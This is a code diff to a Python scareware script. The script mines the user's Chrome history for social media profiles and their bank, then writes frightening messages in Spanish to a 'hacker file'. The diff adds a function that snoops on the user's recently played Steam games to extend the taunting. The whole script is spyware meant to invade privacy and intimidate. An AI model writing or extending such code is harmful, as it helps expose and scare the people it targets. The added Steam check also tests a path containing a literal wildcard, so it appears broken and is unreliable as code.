@@ -5,6 +5,7 @@ from time import sleep
 from random import randrange
 from pathlib import Path
 import sqlite3
+import glob
 
 
 #home_path = "/home/" + os.getlogin()
@@ -98,16 +99,30 @@ def check_bank_account(hacker_file, chrome_history):
     hacker_file.write("Ademas veo que tu banco es el {}".format(his_bank))
 
 
+def check_steam_games(hacker_file):
+    steam_path = home_path + "/.local/share/Steam/steamapps/common/*"
+    if os.path.exists(steam_path):
+        games = []
+        game_paths = glob.glob(steam_path)
+        game_paths.sort(key=os.path.getmtime, reverse=True)
+        for game_path in game_paths:
+            games.append(game_path.split("/")[-1])
+        hacker_file.write("He visto que has estado jugando ultimamente a {}".format(", ".join(games[:3])))
+    else:
+        pass
+
+
 def main():
     print(FILE)
 
     delay_action()
-    hacker_file = create_hacker_file()
     chrome_history = get_chrome_history()
+    hacker_file = create_hacker_file()
     check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
     check_facebook_profiles_and_scare_user(hacker_file, chrome_history)
     check_youtube_profiles_and_scare_user(hacker_file, chrome_history)
     check_bank_account(hacker_file, chrome_history)
+    check_steam_games(hacker_file)
 
 
 if __name__ == "__main__":
